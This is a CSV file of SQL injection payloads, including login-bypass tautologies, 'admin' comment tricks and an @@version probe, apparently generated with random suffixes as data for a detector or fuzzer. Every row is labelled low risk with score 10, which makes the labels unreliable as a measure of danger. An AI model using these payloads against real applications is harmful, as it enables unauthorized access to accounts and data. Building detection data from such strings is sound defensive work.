query,risk,score
""" OR ""1""=""1 /**/",low,10
1' OR '1'='1 # 5j,low,10
' OR 'x'='x -- j,low,10
1' or true -- /**/,low,10
admin' /**/ # lp,low,10
' OR 1=1 -- -- i,low,10
' OR 1 IN (SELECT @@version) -- -- d,low,10
1' or '1'='1 /**/,low,10
1' or true -- -- 4,low,10
1' OR '1'='1 /**/,low,10
' OR 1 IN (SELECT @@version) -- -- u,low,10
' OR 'a'='a -- 9,low,10
admin' -- -- j,low,10
' or 'a'='a /**/,low,10
' or 'a'='a -- v,low,10
' OR 'a'='a -- x,low,10
1' or 1=1 -- /**/,low,10
admin' /**/ # 2x,low,10
' or 'a'='a # 25,low,10
' || 1=1 -- /**/,low,10
' || 1=1 -- # p7,low,10
1' or '1'='1 /**/,low,10
' OR 1=1 -- /**/,low,10
' || 1=1 -- # d4,low,10
1' or 1=1 -- /**/,low,10
' OR 'a'='a -- 5,low,10
' OR 1 IN (SELECT @@version) -- # 97,low,10
' OR 1 IN (SELECT @@version) -- # ew,low,10
1' or true -- # 54,low,10
' or 'a'='a -- k,low,10
' OR 1=1 LIMIT 1 -- # 1x,low,10
1' or true -- /**/,low,10
admin' -- /**/,low,10
1' or 1=1 -- /**/,low,10
' OR 'a'='a /**/,low,10
""" OR ""1""=""1 /**/",low,10
1' or true -- /**/,low,10
admin' -- # 5f,low,10
1' or 1=1 -- /**/,low,10
' OR 1=1 LIMIT 1 -- # kz,low,10
admin' -- /**/,low,10
admin' -- /**/,low,10
' OR 1=1 -- -- 4,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
1' or '1'='1 /**/,low,10
' OR 1=1 -- # s9,low,10
1' or 1=1 -- -- 1,low,10
' OR 1 IN (SELECT @@version) -- -- 6,low,10
admin' -- -- c,low,10
1' OR '1'='1 -- u,low,10
admin' /**/ # f3,low,10
' OR 'a'='a # zo,low,10
' OR 'x'='x -- 6,low,10
' OR 1 IN (SELECT @@version) -- -- x,low,10
1' or '1'='1 # jk,low,10
' || 1=1 -- /**/,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
' OR 1=1 -- /**/,low,10
' OR 1=1 LIMIT 1 -- -- e,low,10
admin' /**/ -- j,low,10
1' or '1'='1 -- w,low,10
' OR 1=1 -- # l9,low,10
""" OR ""1""=""1 -- l",low,10
1' OR '1'='1 /**/,low,10
' or 'a'='a # yc,low,10
' OR 1 IN (SELECT @@version) -- -- g,low,10
' OR 'a'='a # we,low,10
' OR 'a'='a -- j,low,10
admin' -- -- 8,low,10
admin' -- -- 7,low,10
admin' -- # rd,low,10
""" OR ""1""=""1 /**/",low,10
admin' /**/ /**/,low,10
""" OR ""1""=""1 /**/",low,10
admin' -- -- d,low,10
' || 1=1 -- -- l,low,10
""" OR ""1""=""1 # se",low,10
' OR 'a'='a /**/,low,10
admin' -- # kw,low,10
' OR 1=1 -- -- 0,low,10
' OR 'x'='x -- 6,low,10
1' or true -- /**/,low,10
admin' /**/ /**/,low,10
' OR 1=1 -- -- 5,low,10
' OR 'a'='a -- v,low,10
admin' -- # i0,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
' or 'a'='a /**/,low,10
' OR 1=1 LIMIT 1 -- # he,low,10
' OR 'a'='a # a0,low,10
' OR 1=1 LIMIT 1 -- /**/,low,10
1' or 1=1 -- /**/,low,10
' OR 1=1 LIMIT 1 -- # ld,low,10
admin' -- -- u,low,10
' OR 1=1 LIMIT 1 -- -- o,low,10
' OR 'x'='x # t9,low,10
' OR 1=1 -- /**/,low,10
1' OR '1'='1 # 8h,low,10
' || 1=1 -- # g8,low,10
admin' -- -- n,low,10
' || 1=1 -- /**/,low,10
' OR 1=1 -- # ch,low,10
1' or '1'='1 /**/,low,10
1' OR '1'='1 # 2y,low,10
' OR 1=1 LIMIT 1 -- -- r,low,10
""" OR ""1""=""1 /**/",low,10
1' or '1'='1 -- 5,low,10
admin' -- /**/,low,10
admin' -- # ft,low,10
admin' /**/ # a3,low,10
' OR 1 IN (SELECT @@version) -- -- e,low,10
1' OR '1'='1 # 64,low,10
' or 'a'='a # zz,low,10
admin' -- # w5,low,10
""" OR ""1""=""1 # xw",low,10
' OR 'x'='x /**/,low,10
' OR 1=1 LIMIT 1 -- -- 6,low,10
admin' -- -- e,low,10
' OR 1=1 LIMIT 1 -- # l5,low,10
' OR 'x'='x /**/,low,10
' OR 1 IN (SELECT @@version) -- # xe,low,10
' OR 'x'='x # lz,low,10
admin' -- # jx,low,10
1' OR '1'='1 /**/,low,10
' OR 'a'='a /**/,low,10
admin' -- -- g,low,10
admin' /**/ -- u,low,10
admin' /**/ -- g,low,10
""" OR ""1""=""1 -- r",low,10
' || 1=1 -- /**/,low,10
' OR 'x'='x # de,low,10
""" OR ""1""=""1 -- p",low,10
' or 'a'='a # ot,low,10
1' or true -- # pu,low,10
1' or true -- # vc,low,10
' OR 1=1 -- # d6,low,10
' || 1=1 -- /**/,low,10
admin' /**/ /**/,low,10
' or 'a'='a # c1,low,10
' OR 1 IN (SELECT @@version) -- /**/,low,10
1' or true -- -- e,low,10
' OR 1=1 -- # 07,low,10
